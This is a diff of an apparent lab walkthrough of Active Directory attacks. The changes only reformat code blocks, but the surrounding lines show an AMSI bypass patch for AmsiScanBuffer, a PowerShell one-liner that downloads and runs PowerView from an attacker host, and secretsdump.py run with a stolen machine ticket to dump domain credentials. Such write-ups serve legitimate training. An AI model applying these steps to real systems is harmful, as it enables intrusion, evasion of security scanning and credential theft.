@@ -73,7 +73,7 @@ Works for computers and users
 
 **asmi.txt**
 
-```shell
+```
 # Patching amsi.dll AmsiScanBuffer by rasta-mouse
 $Win32 = @"
 
@@ -107,7 +107,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 
 We can use the following script in Powershell to enumerate Unconstrained Delegation.
 
-```powershell
+```
 # Import the Active Directory module
 Import-Module ActiveDirectory
 
@@ -137,7 +137,7 @@ foreach ($user in $users) {
 
 Then we can upload PowerView.ps1 using this
 
-`iex (iwr -UseBasicParsing ``[http://10.4.10.1:8080/PowerView.ps1](http://192.168.56.1:8080/PowerView.ps1)``)`
+`iex (iwr -UseBasicParsing http://10.4.10.1:8080/PowerView.ps1)`
 
 After uploading PowerView.ps1 we just need to the machine we just need to import it. 
 
@@ -200,7 +200,7 @@ From the screenshot above we can see that we can see KINGSLANDING$ TGT.
 
 `export KRB5CCNAME=KINGSLANDING$.ccache`
 
-`[secretsdump.py](http://secretsdump.py/)`` -k -no-pass sevenkingdoms.local/'kingslanding$'@kingslanding`
+`secretsdump.py -k -no-pass sevenkingdoms.local/'kingslanding$'@kingslanding`
 
 ![screenshot_14.png](./images/screenshot_14.png)
 
